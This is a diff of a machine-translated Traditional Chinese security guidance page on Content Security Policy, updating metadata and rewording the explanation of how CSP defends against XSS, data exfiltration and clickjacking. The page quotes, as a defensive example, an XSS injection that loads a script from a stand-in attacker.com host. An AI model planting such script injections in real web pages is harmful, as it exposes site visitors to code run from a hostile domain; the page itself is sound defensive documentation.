@@ -17,12 +17,12 @@ ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
 ms.custom: devx-track-javascript, devx-track-csharp
-ms.openlocfilehash: 9410f06298bd40fe6e0bf8f3fca1be4b87f793ed
-ms.sourcegitcommit: 419cf179f9597936378ed5098ef77437dbf16295
+ms.openlocfilehash: 3aeaebe49999ce65779072f8579a404f9397d50d
+ms.sourcegitcommit: 58d3b3314df4ba3cabd4d4a6016b22fa5264f05a
 ms.translationtype: MT
 ms.contentlocale: zh-TW
-ms.lasthandoff: 08/27/2020
-ms.locfileid: "89004488"
+ms.lasthandoff: 09/02/2020
+ms.locfileid: "89299978"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架︰組態管理 | 緩和措施 
 | 產品/服務 | 發行項 |
@@ -46,7 +46,7 @@ ms.locfileid: "89004488"
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | [內容安全性原則簡介](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](https://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src="http://attacker.com/maliciousCode.js"/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 允許清單中</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的白名單中</li><li>**防禦點擊劫持：** 點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
+| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是允許以清單為基礎的原則-網站可以宣告一組受信任的網域，讓您可以載入 JavaScript 這類的活動內容。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src="http://attacker.com/maliciousCode.js"/>`。 此惡意探索將無法運作，因為攻擊者控制的網域將不在 CSP 允許的網域清單中</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域將不在 CSP 的允許清單中</li><li>**防禦點擊劫持：** 點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
 
 ### <a name="example"></a>範例
 範例原則︰ 
